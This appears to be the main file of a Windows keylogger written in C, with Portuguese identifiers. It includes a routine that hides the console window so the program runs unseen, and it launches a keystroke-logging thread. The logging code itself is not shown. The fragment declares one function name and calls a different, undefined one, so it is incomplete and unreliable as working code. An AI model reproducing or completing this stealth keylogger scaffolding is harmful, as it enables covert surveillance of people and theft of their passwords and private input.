#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>
int telaInvisivel = 0;
void escondeTela(void)
{
	HWND stealth;
	stealth = FindWindow("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}
int main(int argc, char* argv[])
{
	int startKeyLogging(char* argv[]);
	if (telaInvisivel) escondeTela();
	iniciaThread(argv);
	system("pause");
	return 0;
}
